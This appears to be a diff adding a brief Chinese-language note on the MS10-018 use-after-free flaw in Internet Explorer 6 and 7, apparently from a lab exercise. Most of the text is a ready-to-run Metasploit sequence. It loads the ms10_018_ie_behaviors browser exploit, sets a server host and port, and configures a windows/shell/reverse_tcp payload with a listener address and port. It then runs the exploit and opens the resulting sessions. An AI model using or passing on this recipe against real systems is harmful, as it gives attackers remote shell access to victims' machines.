@@ -1,0 +1,21 @@
+微软 IE畸形对象操作内存破坏漏洞
+受影响系统
+IE7.0
+IE6.0 SP1
+IE6.0
+IE通过使用iepeers.dll组件提供对Web文件和打印的支持，
+该组件中存在释放后使用错误。如果用户加载了特制的HTML
+文档或Office文件，未经认证的远程攻击者就可以导致拒绝服务或
+执行任意代码。
+
+
+search ms10_018
+use exploit/window/browser/ms10_018_ie_behaviors
+show options
+set SRVHOST 192.168.2.128
+set SRVPORT 8081
+set payload windows/shell/reverse_tcp
+set LHOST 192.168.2.128
+set LPORT 1212
+exploit
+sessions -i 查看会话
